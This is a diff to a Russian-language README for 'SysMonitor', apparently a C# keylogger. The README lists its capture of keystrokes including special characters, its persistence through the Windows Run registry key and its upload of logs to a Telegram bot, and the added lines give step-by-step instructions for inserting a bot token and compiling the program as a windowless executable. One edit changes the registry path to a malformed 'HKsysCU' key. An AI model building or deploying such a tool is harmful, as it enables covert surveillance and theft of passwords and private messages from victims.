@@ -12,7 +12,7 @@
 - Запись в `keystrokes.txt` рядом с `.exe`.
 - Опрос Telegram Bot API: команды `/log` и `/start`.
 - Отправка файла лога как документа в Telegram.
-- Автозагрузка через реестр `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
+- Автозагрузка через реестр `HKsysCU\Software\Microsoft\Windows\CurrentVersion\Run`.
 
 ## Требования
 
@@ -24,3 +24,20 @@
 ## Сборка
 
 Из командной строки, компилятором .NET Framework:
+
+
+## Установка
+1) Откройте файл `SysMonitor.cs`
+2) Найдите в нем строку `private const string BotToken` (располагается в самом начале)
+3) После знака " = " необходимо вставить токен вашего бота из телеграмма (Получаем у @BotFather)
+4) Далее открываем `powershell`
+5) Заходим через него в папку с вашим исправленным файлом.
+`cd C:\SyS
+& C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /target:winexe /out:C:\SyS\SysMonitor.exe /reference:System.Windows.Forms.dll C:\SyS\SysMonitor.cs` - адаптируйте этот код под свой путь и запустите его через `powershell`
+6) Готово, в вашей папке создался файл `SysMonitor.exe`
+
+## Возможности
+1) Запись клавиш, вводимых с клавиатуры (включая спец символы)
+2) Автоматическое помещение в автозагрузку
+3) Выгрузка логов в телеграмм бота
+4) Автоопределение чат айди
